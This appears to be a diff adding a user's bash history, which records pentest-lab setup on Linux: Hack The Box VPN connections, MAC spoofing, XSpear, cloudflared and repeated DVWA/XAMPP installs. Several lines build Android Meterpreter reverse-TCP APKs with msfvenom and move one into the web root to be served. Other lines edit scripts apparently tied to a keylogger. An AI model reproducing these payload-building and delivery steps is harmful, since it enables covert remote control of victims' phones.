@@ -1,0 +1,349 @@
+  501  ifconfig
+  502  sudo ifconfig
+  506  sudo nano /etc/proxychains.conf
+  522  sudo ifconfig
+  526  sudo ifconfig 
+  527  sudo ifconfig wlol down 
+  529  sudo ifconfig wlol down
+  531  sudo ifconfig wlol down
+  532  sudo ifconfig wlo1 down
+  549  git clone https//github.com/hahwul/XSpear.git
+  550  git clone https://github.com/hahwul/XSpear.git
+  551  cd XSpear/
+  558  git clone https://github.com/hahwul/XSpear.git
+  559  cd XSpear/
+  564  git clone https://github.com/hahwul/XSpear.git
+  567  git clone https://github.com/hahwul/XSpear.git
+  568  cd XSpear
+  570  cd XSpear/
+  582  sudo dpkg --configure -a
+  588  cd ~/Desktop
+  589  nano brave-browser.desktop
+  591  cd XSpear/
+  596  cd XSpear/
+  616  cd XSpear/
+  626  cd XSpear/
+  648  sudo nano XSpear.txt
+  652  cd XSpear/
+  653  cd ..
+  655  git clone https://github.com/hahwul/XSpear.git
+  656  cd XSpear/
+  684  sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.4.234 LPORT=9051 -o change.apk
+  686  sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.4.234 LPORT=9051 -o change.apk
+  688  sudo mv change.apk /var/www/html
+  690  sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=<port_you_want_to_listen_on> -o <any_name>.apk
+  693  set payload android/meterpreter/reverse_tcp
+  710  sudo nano /etc/apt/sources.list
+  717  sudo nano /etc/apt/sources.list /etc/apt/sources.list.backup
+  719  sudo nano metasploit.txt
+  724  sudo openvpn --config /path/to/ your/file.ovpn
+  725  sudo openvpn --config /path/to/your/file.ovpn
+  726  sudo openvpn --config /home/imperialkhani/Downloads/htb-access.ovpn
+  727  cd ~/Downloads
+  729  sudo openvpn --config /home/imperialkhani/Downloads/htb-access.ovpn
+  730  sudo openvpn --config /home/imperialkhani/Downloads/starting_point_ProfXavier.ovpn
+  731  sudo nano /home/imperialkhani/Downloads/starting_point_ProfXavier.ovpn
+  732  sudo openvpn --config /home/imperialkhani/Downloads/starting_point_ProfXavier.ovpn
+  734  sudo nano /home/imperialkhani/Downloads/starting_point_ProfXavier.ovpn
+  735  udo nano /home/imperialkhani/Downloads/starting_point_ProfXavier.ovpn
+  736  sudo nano /home/imperialkhani/Downloads/starting_point_ProfXavier.ovpn
+  737  sudo openvpn --config /home/imperialkhani/Downloads/starting_point_ProfXavier.ovpn
+  738  cd Downloads
+  739  sudo openvpn --config /home/imperialkhani/Downloads/starting_point_ProfXavier.ovpn
+  740  sudo openvpn --config /home/imperialkhani/steghide/starting_point_ProfXavier.ovpn
+  741  cd Downloads
+  742  sudo openvpn --config /home/imperialkhani/Downloads/starting_point_ProfXavier.ovpn
+  744  sudo ifconfig 84:4b:f5:72:75:3f down
+  745  ifconfig
+  746  sudo ifconfig
+  748  sudo ifconfig 84:4b:f5:72:75:3f down
+  749  sudo ifconfig b4:b5:2f:34:e5:b4
+  750  sudo ifconfig wlo1 down
+  751  sudo if config wlo1 hw ether 00:11:22:33:44:55
+  753  sudo ifconfig wlo1 up
+  754  ifconfig wlo1
+  756  cd Downloads
+  757  sudo openvpn --config /home/imperialkhani/Downloads/starting_point_ProfXavier.ovpn
+  758  cd Downloads
+  759  sudo openvpn --config /home/imperialkhani/Downloads/starting_point_ProfXavier.ovpn
+  761  sudo nano ovpn.txt
+  762  cd Downloads
+  763  sudo openvpn --config /home/imperialkhani/Downloads/starting_point_ProfXavier.ovpn
+  766  sudo nano ovpn.txt
+  767  sudo nano metasploit.txt
+  769  sudo cp /etc/apt/sources.list /etc/apt/sources.list.backup
+  770  sudo nano /etc/apt/sources.list
+  773  udo msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.4.234 LPORT=9051 -o money.apk
+  774  sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.4.234 LPORT=9051 -o money.apk
+  786  cd Downloads
+  787  cd ..
+  789  cd /home/imperialkhani/Downloads
+  793  cd /home/imperialkhani/Downloads/proguard-7.6/
+  794  cd proguard-7.6.0
+  817  cd proguard.7.6.0
+  818  cd /Downloads/proguard.7.6.0/
+  819  cd /home/imperialkhani/Downloads/proguard-7.6.0/
+  822  nano proguard.cfg
+  824  mv ~/Desktop/money.apk ~/Downloads/
+  835  cd ~/Android/cmdline-tools/tools/bin/
+  843  cd ~/home/imperialkhani/Android/cmdline-tools/cmdline-tools/bin/sdkmanager
+  844  cd Android
+  846  cd Sdk
+  848  cd..
+  849  cd ..
+  851  cd cmdline-tools
+  852  cd Sdk
+  854  cd ..
+  856  cd Sdk
+  858  cd build-tools
+  860  cd 30.0.3
+  862  cd ..
+  864  cd cmdline-tools
+  866  cd tools
+  868  cd bin
+  870  cd cmdline-tools
+  872  cd ..
+  874  cd ..
+  876  cd Sdk
+  879  cd ..
+  881  cd cmdline-tools
+  883  cd tools
+  885  cd bin
+  889  chmod +x ~/Android/cmdline-tools/tools/bin/sdkmanager
+  892  cd cmdline-tools
+  894  cd bin
+  896  chmod +x
+  897  chmod +x sdkmanager
+  899  chmod +x /Android/cmdline-tools/tools/bin/cmdline-tools/bin/sdkmanager
+  900  chmod +x sdkmanager
+  905  chmod +x sdkmanager
+  913  cd sdkmanager
+  916  chmod +x /home/imperialkhani/Android/cmdline-tools/tools/bin/cmdline-tools/bin/sdkmanager
+  925  chmod +x /home/imperialkhani/Android/cmdline-tools/tools/bin/sdkmanager
+  926  chmod +x /home/imperialkhani/Android/cmdline-tools/tools/bin/cmdline-tools/bin/sdkmanager
+  928  chmod +x /home/imperialkhani/Android//cmdline-tools/bin/sdkmanager
+  930  chmod +x /home/imperialkhani/Android/cmdline-tools/tools/bin/cmdline-tools/bin/sdkmanager
+  933  cd ..
+  939  mv ~/Downloads/commandlinetools-linux-*.zip ~/Android/cmdline-tools/
+  940  cd ~/Android/cmdline-tools
+  942  mv cmdline-tools/* tools
+  949  chmod +x ~/Android/build-tools/30.0.3/apksigner
+  960  sudo ufw allow 9040/tcp
+  963  sudo ifconfig
+  965  set ufw allow 9040/tcp
+  967  sudo ufw allow 9040/tcp
+  968  ifconfig
+  969  sudo ifconfig
+  975  sudo nano github connect
+  977  sudo nano github
+  978  sudo nano github.txt
+  981  sudo nano.txt
+  982  sudo nano metasploit.txt
+  985  sudo nano  proguardmeta.txt
+  991  sudo nano kingsman.py
+  992  nano killman.py
+  998  sudo nano kingsman.py
+ 1000  chmod +x kingsman.py
+ 1001  sudo chmod +x kingsman.py
+ 1007  sudo nano /etc/resolv.conf
+ 1021  nano kingsman.py
+ 1023  chmod +x kingsman.py
+ 1024  sudo chmod +x kingsman.py
+ 1028  sudo chmod +x kingsman.py
+ 1031  sudo nano kingsman.py
+ 1034  sudo nano keylogger.txt
+ 1035  chmod 666  kingsman_log.txt
+ 1038  nano bond.py
+ 1039  chmod +x bond.py
+ 1052  ifconfig wl01
+ 1053  ifconfig
+ 1054  sudo ifconfig wl01
+ 1055  sudo ifconfig
+ 1056  sudo ifconfig wlo1
+ 1057  sudo ifconfig wlo1 down
+ 1059  sudo ifconfig wlo1 down
+ 1061  sudo ifconfig wlo1 up
+ 1062  sudo ifconfig wlo1
+ 1075  sudo nano /etc/cloudflared/config.yml
+ 1079  sudo nano /etc/clouflared/config.yml
+ 1081  cd /etc/clouflared
+ 1083  sudo touch /etc/cloudflared/config.yml
+ 1084  sudo nano /etc/cloudflared/config.yml
+ 1092  sudo nano /etc/cloudflared/config.yml
+ 1096  chmod +x cloudflared
+ 1097  sudo mv cloudflared /usr/local/bin
+ 1110  sudo nano /etc/systemd/system/cloudflared.service
+ 1117  sudo nano /etc/systemd/system/cloudflared.service
+ 1133  chmod +x cloudflared
+ 1134  sudo mv cloudflared /usr/local/bin/
+ 1137  sudo touch /etc/cloudflared/config.yml
+ 1138  sudo nano /etc/cloudflared/config.yml
+ 1142  sudo nano /etc/systemd/system/cloudflared.service
+ 1147  sudo nano /etc/resolv.conf
+ 1148  sudo nano /etc/systemd/system/cloudflared.service
+ 1149  sudo nano /etc/systemd/system/cloudflared.servic
+ 1155  ExecStart=/usr/local/bin/cloudflared proxy-dns --config /etc/cloudflared/config.yml
+ 1156  sudo nano /etc/cloudflared/config.yml
+ 1157  sudo cloudflared proxy-dns --config /etc/cloudflared/config.yml
+ 1158  sudo nano /etc/cloudflared/config.yml
+ 1159  sudo nano /etc/resolv.conf
+ 1160  sudo nano /etc/systemd/system/cloudflared.service
+ 1170  sudo nano /etc/cloudflared/config.yml
+ 1171  sudo nano /etc/systemd/system/cloudflared.service
+ 1176  sudo nano /etc/systemd/system/cloudflared.service
+ 1201  sudo nano /etc/resolv.conf
+ 1212  sudo nano /etc/resolv.conf
+ 1214  sudo nano /etc/NetworkManager/NetworkManager.conf
+ 1225  sudo openvpn --config /home/imperialkhani/ovpn.txt
+ 1226  sudo openvpn --config ~/ovpn.txt
+ 1228  sudo openvpn --config /home/imperialkhani/ovpn.txt
+ 1229  nano /home/imperialkhani/ovpn.txt
+ 1230  sudo openvpn --config /home/imperialkhani/ProfXavier.ovpn
+ 1231  mv /home/imperialkhani/ovpn.txt /home/imperialkhani/ovpn.ovpn
+ 1232  sudo openvpn --config /home/imperialkhani/ovpn.ovpn
+ 1237  sudo nano /etc/apt/sources.list
+ 1238  sudo nano /etc/apt/sources.list.d/protonvpn.list
+ 1264  sudo openvpn --config /home/imperialkhani/htb.ovpn
+ 1266  sudo chmod 644 /home/imperialkhani/htb.ovpn
+ 1268  sudo openvpn --config /home/imperialkhani/ovpn.ovpn
+ 1269  sudo chmod 644 /home/imperialkhani/ovpn.ovpn
+ 1270  sudo openvpn --config /home/imperialkhani/ovpn.ovpn
+ 1271  nano/home/imperialkhani/ovpn.ovpn
+ 1272  nano /home/imperialkhani/ovpn.ovpn
+ 1273  sudo openvpn --config /home/imperialkhani/ovpn.ovpn
+ 1278  sudo chmod 644 /home/imperialkhani/ovpn.ovpn
+ 1279  sudo openvpn --config /home/imperialkhani/ovpn.ovpn
+ 1283  sudo openvpn --config /home/imperialkhani/htb.ovpn
+ 1296  sudo /usr/sbin/openvpn --config /home/imperialkhani/htb.ovpn
+ 1305  cd ~/Downloads
+ 1306  chmod +x xampp-linux-x64-*.run
+ 1307  sudo ./xampp-linux-x64-*.run
+ 1308  cd /opt/lampp
+ 1313  history | grep -E 'xampp|mysql|dvwa' > dvwa_setup_commands.txt
+ 1314  nano dvwa_setup_commands.txt
+ 1318  history | grep "DVWA"
+ 1319  history > DVWA_commands.txt
+ 1320  nano DVWA_commands.txt
+ 1321  history | grep -E '(xampp|mysql|dvwa)' > dvwa_setup_commands.txt
+ 1322  history | grep -E "(xampp|mysql|dvwa)" > dvwa_setup_commands.txt
+ 1323  nano dvwa_setup_commands.txt
+ 1325  rm DVWA_commands.txt dvwa_setup_commands.txt
+ 1326  history | grep 'xampp' > dvwa_setup_commands.txt
+ 1327  nano dvwa_setup_commands.txt
+ 1328  history | grep 'mysql' >> dvwa_setup_commands.txt
+ 1330  nano dvwa_setup_commands.txt
+ 1336  nano dvwa_setup_commands.txt
+ 1338  nano dvwa_setup_commands.txt
+ 1342  nano dvwa_setup_commands.txt
+ 1348  nano dvwa_setup_commands.txt
+ 1354  cd /opt/lampp/htdocs
+ 1355  sudo rm -rf DVWA
+ 1356  sudo /opt/lampp/bin/mysql -u root -p
+ 1357  sudo /opt/lampp/bin/mysql -u root 
+ 1358  sudo /opt/lampp/bin/mysql -u root -p
+ 1359  sudo /opt/lampp/lampp start
+ 1360  sudo /opt/lampp/bin/mysql -u root -p
+ 1361  sudo nano /opt/lampp/etc/my.cnf
+ 1362  sudo /opt/lampp/bin/mysql -u root -p
+ 1363  sudo /lampp/lampp stop
+ 1364  sudo /opt/lampp/lampp stop
+ 1365  sudo rm -rf /opt/lampp
+ 1366  cd /home/imperialkhani/
+ 1368  cd Downloads
+ 1370  chmod +x xampp-linux-x64-8.2.12-0-installer.run
+ 1371  sudo ./xampp-linux-x64-8.2.12-0-installer.run
+ 1375  cd ~/Downloads
+ 1377  chmod +x xampp-linux-x64-8.2.12-0-installer.run
+ 1378  sudo ./xampp-linux-x64-8.2.12-0-installer.ru
+ 1379  sudo ./xampp-linux-x64-8.2.12-0-installer.run
+ 1381  git clone https://github.com/digininja/DVWA.git
+ 1382  sudo mv DVWA /opt/lampp/htdocs/
+ 1383  sudo chmod -R 755 /opt/lampp/htdocs/DVWA
+ 1384  sudo nano /opt/lampp/htdocs/DVWA/config/config.inc.php
+ 1386  ls /opt/lampp/htdocs
+ 1387  sudo nano /opt/lampp/htdocs/DVWA/config/config.inc.php
+ 1388  sudo /opt/lampp/bin/mysql -u root -p
+ 1389  sudo /opt/lampp/lampp startmysql --skip-grant-tables --skip-networking
+ 1390  sudo /opt/lampp/bin/mysql -u root
+ 1391  sudo /opt/lampp/bin/mysql -u root -p
+ 1392  sudo nano /opt/lampp/etc/my.cnf
+ 1393  sudo /opt/lampp/lampp startmysq
+ 1394  sudo /opt/lampp/lampp startmysql
+ 1395  sudo /opt/lampp/lampp status
+ 1396  sudo /opt/lampp/bin/mysql -u root -p
+ 1397  sudo /opt/lampp/bin/mysql -u root
+ 1398  sudo /opt/lampp/lampp stop
+ 1399  sudo /opt/lampp/lampp start
+ 1400  sudo /opt/lampp/lampp stop
+ 1401  sudo /opt/lampp/lampp start
+ 1402  sudo /opt/lampp/lampp startmysql
+ 1403  sudo nano /opt/lampp/htdocs/DVWA/config/config.inc.php
+ 1404  sudo /opt/lampp/lampp start
+ 1405  cd /opt/lampp
+ 1408  cd Downloads
+ 1409  cd ~/Downloads
+ 1411  chmod +x xampp-linux-x64-8.2.12-0-installer.run
+ 1412  git clone https://github.com/digininja/DVWA.git
+ 1413  sudo mv DVWA /opt/lampp/htdocs/
+ 1414  cd /opt/lampp
+ 1415  sudo chmod -R 755 /opt/lampp/htdocs/DVWA
+ 1416  sudo nano /opt/lampp/htdocs/DVWA/config/config.inc.php
+ 1418  sudo /opt/lampp/lampp startmysql
+ 1419  cat /opt/lampp/var/mysql/$(hostname).err
+ 1420  sudo chown -R mysql:mysql /opt/lampp/var/mysq
+ 1421  sudo chmod -R 755 /opt/lampp/var/mysql
+ 1422  sudo /opt/lampp/lampp startmysql
+ 1423  sudo /opt/lampp/bin/mysql -u root -p
+ 1424  sudo /opt/lampp/bin/mysql -u root
+ 1425  cd /opt/lampp/htdocs
+ 1426  sudo rm -rf DVWA
+ 1427  sudo /opt/lampp/bin/mysql -u root p
+ 1428  sudo mysql -u root -p
+ 1429  sudo systemctl stop mysql
+ 1430  sudo mysqld_safe --skip-grant-tables &
+ 1431  mysql -u root
+ 1432  sudo systemctl stop mysql
+ 1433  sudo systemctl start mysql
+ 1435  cd Downloads
+ 1437  sudo mysql -u root -p
+ 1438  sudo apt-get remove --purge mysql-server mysql-client mysql-common
+ 1439  sudo rm -rf /etc/mysql /var/lib/mysql
+ 1442  DVWA --version
+ 1443  cd /opt/lampp/htdocs
+ 1444  cd ~/Downloads
+ 1446  chmod +x xampp-linux-x64-8.2.12-0-installer.run
+ 1447  sudo ./xampp-linux-x64-8.2.12-0-installer.run
+ 1448  sudo /opt/lampp/lampp start
+ 1449  cd /opt/lampp
+ 1451  sudo /opt/lampp/lampp stop
+ 1452  sudo rm -rf /opt/lampp
+ 1454  cd Downloads
+ 1455  cd /home/imperialkhani/
+ 1456  cd Downloads
+ 1458  rm xampp-linux-x64-8.2.12-0-installer.run
+ 1461  chmod +x xampp-linux-x64-8.2.12-0-installer.run
+ 1462  sudo ./xampp-linux-x64-8.2.12-0-installer.run
+ 1464  sudo nano /opt/lampp/etc/my.cnf
+ 1465  sudo ./xampp-linux-x64-8.2.12-0-installer.run
+ 1466  sudo /opt/lampp/lampp start
+ 1467  cd /opt/lampp
+ 1469  git clone https://github.com/digininja/DVWA.git
+ 1470  cd /home/imperialkhani/
+ 1471  cd Downloads
+ 1472  git clone https://github.com/digininja/DVWA.git
+ 1473  rm -rf DVWA
+ 1474  sudo git clone https://github.com/digininja/DVWA.git /opt/lampp/htdocs/DVWA
+ 1475  cd DVWA
+ 1477  cd /opt/lampp/htdocs/DVWA
+ 1479  sudo chmod -R 755 /opt/lampp/htdocs/DVWA
+ 1480  cd /opt/lampp/htdocs/DVWA/config
+ 1481  sudo cp config.inc.php.dist config.inc.ph
+ 1482  sudo cp config.inc.php.dist config.inc.php.dist 
+ 1483  sudo mv config.inc.ph config.inc.php
+ 1484  sudo nano config.inc.php
+ 1485  sudo /opt/lampp/lampp startmysql
+ 1486  sudo /opt/lampp/bin/mysql -u root -p
+ 1489  cd Downloads
+ 1490  cd /home/imperialkhani/
+ 1491  cd Downloads
+ 1493  history | grep -E "git clone|chmod|mv|nano|cp|cd|mysql|config|lampp|xampp|DVWA" > dvwa_setup_commands.txt
